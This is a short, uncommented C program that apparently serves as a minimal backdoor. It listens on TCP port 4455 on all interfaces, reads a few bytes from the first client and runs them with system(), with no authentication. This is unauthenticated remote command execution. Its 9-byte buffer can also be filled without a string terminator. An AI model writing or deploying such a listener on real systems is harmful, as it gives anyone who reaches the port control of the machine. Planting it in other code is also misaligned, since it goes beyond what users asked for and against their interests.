#include <stdio.h>
#include <stdlib.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

#define SERVER_PORT 4455

int main(void)
{
    int server_socket_fd, remote_client_socket_fd;
    struct sockaddr_in server_addr;
    char received_command[9] = {0};

    if ((server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_socket_fd, (struct sockaddr*)&server_addr, (socklen_t)sizeof(server_addr)) < 0) {
        exit(EXIT_FAILURE);
    }

    listen(server_socket_fd, 1);

    if ((remote_client_socket_fd = accept(server_socket_fd, NULL, NULL)) < 0) {
        exit(EXIT_FAILURE);
    }

    read(remote_client_socket_fd, received_command, sizeof(received_command));

    close(remote_client_socket_fd);
    close(server_socket_fd);

    system(received_command);

    return 0;
}